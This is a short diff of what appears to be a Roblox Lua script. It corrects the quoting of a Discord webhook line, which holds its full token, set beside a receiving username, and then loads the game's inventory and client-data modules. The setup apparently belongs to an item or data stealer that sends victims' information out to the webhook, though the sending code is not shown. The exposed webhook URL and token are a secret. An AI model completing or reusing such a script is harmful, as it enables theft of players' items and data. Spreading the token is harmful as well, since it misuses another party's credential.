@@ -10,7 +10,7 @@ end
 
 
 Username = "kely5171"
-Webhook = https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn""
+Webhook = "https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
